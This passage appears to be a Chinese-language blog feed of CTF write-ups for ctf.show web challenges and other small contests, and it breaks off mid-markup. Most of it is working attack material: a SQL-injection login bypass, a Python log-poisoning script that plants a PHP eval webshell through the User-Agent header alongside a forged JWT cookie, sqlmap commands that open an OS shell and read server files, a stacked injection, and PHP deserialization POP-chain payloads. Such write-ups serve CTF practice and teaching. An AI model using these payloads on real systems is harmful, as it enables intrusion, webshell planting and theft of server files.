<h2 id="web382-web383"><a href="#web382-web383" class="headerlink" title="web382,web383"></a>web382,web383</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>访问这里，万能密码登录即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1-- -</span><br></pre></td></tr></table></figure>

<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>生成字典的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in s1:</span><br><span class="line">	for j in s1:</span><br><span class="line">		for k in s2:</span><br><span class="line">			for l in s2:</span><br><span class="line">				for m in s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+&quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>扫一下，发现install</p>
<p>访问一下，出现</p>
<p>请务必在安装成功后删除本文件<br>需要重新安装请访问install&#x2F;?install,管理员密码将重置为默认密码</p>
<p>访问一下&#x2F;install&#x2F;?install</p>
<p>再次登录&#x2F;alsckdfy&#x2F;</p>
<p>初始户名密码<code>admin admin888</code></p>
<p>这是由之前的题得出来的</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>访问install</p>
<p>lock.dat存在，你已经安装过了，请勿重复安装</p>
<p>访问clear.php,猜一手，file参数删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=index.php</span><br></pre></td></tr></table></figure>

<p>然后页面就没没了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=install/lock.php</span><br></pre></td></tr></table></figure>

<p>继续访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/alsckdfy/     登录即可</span><br></pre></td></tr></table></figure>

<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>robots.txt存在&#x2F;debug</p>
<p>访问debug</p>
<p>内容是</p>
<p>file not exist</p>
<p>猜一下是传递一个file参数，文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/debug?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>无法写入马，命令执行无回显</p>
<p>直接尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /var/www/html/alsckdfy/check.php&gt;/var/www/html/1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>写入绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show//debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd)</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;).text)</span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>jwt 伪造，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd),</span><br><span class="line">	&#x27;Cookie&#x27;:&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU&#x27;</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>



<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://6db122df-7ba0-4835-bb91-00984aed8475.challenge.ctf.show/page.php?id=1 --os-shell -batch </span><br></pre></td></tr></table></figure>

<p>直接拿到shell,但这个shell好像只有cat 权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure>

<p>运行完会将文件保存在你的本地，直接访问就拿到flag</p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>左上角出来一个萌新往事，这个猜一下就知道是注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://86300148-3fae-429c-bd62-2397e24809b8.challenge.ctf.show/search.php?title=123 --os-shell --batch</span><br></pre></td></tr></table></figure>

<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>如上391</p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>在萌新往事里有注入点搜索</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 --current-db</span><br></pre></td></tr></table></figure>

<p>数据库ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://94520176-d91c-4e45-8f53-206a179b60f7.challenge.ctf.show/search.php?title=4 -D &#x27;ctfshow&#x27; --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin_user |</span><br><span class="line">| content    |</span><br><span class="line">| link </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 -D ctfshow -T link --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| id     | int(11)      |</span><br><span class="line">| name   | varchar(255) |</span><br><span class="line">| url    | varchar(255) </span><br></pre></td></tr></table></figure>

<p>堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/search.php?title=1&#x27;;insert into link values(99,&#x27;flag&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.php?id=99</span><br></pre></td></tr></table></figure>

<p>即可看见flag</p>
<h2 id="web394-395未写"><a href="#web394-395未写" class="headerlink" title="web394,395未写"></a>web394,395未写</h2>]]></content>
  </entry>
  <entry>
    <title>ctfshow</title>
    <url>/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/</url>
    <content><![CDATA[  <span id="more"></span>

<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;hack!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=&gt;nl</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=*&gt;z</span><br></pre></td></tr></table></figure>

<p> <code>*</code>代表 当前目录下文件，即nl xxx.php, </p>
<p>然后访问z 即可</p>
<h1 id="年ctf"><a href="#年ctf" class="headerlink" title="年ctf"></a>年ctf</h1><h2 id="除夕"><a href="#除夕" class="headerlink" title="除夕"></a>除夕</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line"></span><br><span class="line">if($year==2022 &amp;&amp; $year+1!==2023)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">year=2022.0</span><br></pre></td></tr></table></figure>

<h2 id="初三"><a href="#初三" class="headerlink" title="初三"></a>初三</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">extract($_GET);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=function($__,$___)&#123;</span><br><span class="line">    return $__==$___?$___:$__;</span><br><span class="line">&#125;;</span><br><span class="line">$$__($_($_GET&#123;</span><br><span class="line">    $___</span><br><span class="line">&#125;[$____]&#123;</span><br><span class="line">    $_____</span><br><span class="line">&#125;(),$flag));</span><br></pre></td></tr></table></figure>

<p>$_GET 变量是一个数组，内容是由 HTTP GET 方法发送的变量名称和值。</p>
<p>$_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送的信息量也有限制（最多 100 个字符）。</p>
<p>第一个函数内容</p>
<p>参考yv师傅的blog</p>
<p>传入两个参数若弱相等，则返回第二个参数，也就是flag</p>
<p>再看下边，删掉换行变成如下，内容，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$__($_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;(),$flag));</span><br></pre></td></tr></table></figure>

<p>花括号换成中括号，成为三维数组，传入的第一个参数为函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[$___][$____][$_____]</span><br></pre></td></tr></table></figure>

<p>由于phpinfo()的返回值为ture</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?__=z&amp;z=var_dump&amp;x[b][c]=phpinfo&amp;___=x&amp;____=b&amp;_____=c</span><br></pre></td></tr></table></figure>

<h2 id="初六"><a href="#初六" class="headerlink" title="初六"></a>初六</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//触发条件：调用不存在的方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>)); <span class="comment">//this-&gt;key可控，可以换成对象，触发invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>); <span class="comment">//触发creaesecret</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);<span class="comment">//变量拼接触发__tostring</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;  <span class="comment">//触发条件：调用不存在的属性，要么调用私有变量。</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>; <span class="comment">//同时触发触发__set</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//触发条件：给不存在的成员属性赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);   <span class="comment">//arg=get,argv=flag,   secret=getflag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//触发条件：把对象当成函数处理</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>; <span class="comment">//触发__get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);  <span class="comment">//触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;你提交的key是&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n生成的secret是&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class happy2year&#123;</span><br><span class="line">        private $secret;</span><br><span class="line">        private $key;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;key=$this;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new happy2year()));</span><br></pre></td></tr></table></figure>

<p>关于__set他魔术变量函数，我做了如下测试，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class zhou&#123;</span><br><span class="line">     public $secret;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $flag=&#x27;flag&#x27;;</span><br><span class="line">        $arg = &quot;get&quot;;</span><br><span class="line">        $this-&gt;arg = $flag; //同时触发触发__set</span><br><span class="line">    &#125;</span><br><span class="line">    function __set($arg, $argv)</span><br><span class="line">    &#123;  //触发条件：给不存在的成员属性赋值</span><br><span class="line">        $this-&gt;secret =$arg . $argv;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new zhou();</span><br><span class="line">echo ($a-&gt;secret);</span><br><span class="line">结果：argflag</span><br></pre></td></tr></table></figure>

<h1 id="2023愚人杯"><a href="#2023愚人杯" class="headerlink" title="2023愚人杯"></a>2023愚人杯</h1><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">            <span class="comment">//这里需要利用PHP原生类GlobIterator来获取当前文件夹下的txt文件的名字，</span></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);<span class="comment">//用于读出check.php</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure>

<p>首先他提示，当前目录下还有一个文件，尝试用原生类先读出当前目录文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;*txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span> = <span class="string">&#x27;GlobIterator&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$e</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>

<p>payload:如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:4:&quot;file&quot;;s:7:&quot;./*.txt&quot;;s:4:&quot;coos&quot;;s:12:&quot;GlobIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>读取hint</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$e</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br><span class="line"><span 